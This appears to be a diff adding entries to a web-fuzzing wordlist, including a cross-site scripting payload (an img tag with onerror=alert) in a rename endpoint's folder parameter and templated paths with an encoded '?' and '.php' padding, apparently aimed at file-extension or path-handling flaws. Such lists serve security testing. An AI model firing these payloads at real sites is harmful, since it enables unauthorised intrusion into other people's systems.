@@ -1,0 +1,5 @@
+/path/to/rename/functionality?folder=<img src=/ onerror=alert(0);>
+/zero.txt
+/{{dir}}/
+/{{webroot}}/{{file}}%3F
+/{{webroot}}/{{file}}%3Faaaaaaaaaaaaaaaaaaaaaa.php
